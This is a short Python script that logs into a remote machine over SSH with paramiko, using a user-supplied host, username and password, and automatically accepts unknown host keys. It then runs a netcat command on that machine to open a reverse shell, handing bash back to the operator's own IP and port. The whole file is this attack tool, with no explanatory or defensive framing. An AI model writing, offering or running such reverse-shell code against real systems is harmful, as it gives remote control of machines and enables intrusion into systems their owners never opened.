import paramiko
import socket
host = input("host: ")
user = input("user: ")
passwd = input("password: ")

port_turtle = int(input("your open port: "))

ip_turtle = socket.gethostbyname(socket.gethostname())

rev_turtle = paramiko.SSHClient()
rev_turtle.set_missing_host_key_policy(paramiko.AutoAddPolicy)
rev_turtle.connect(host, username=user, password = passwd)
rev_turtle.exec_command(f"nc -e /bin/bash {ip_turtle} {port_turtle}")
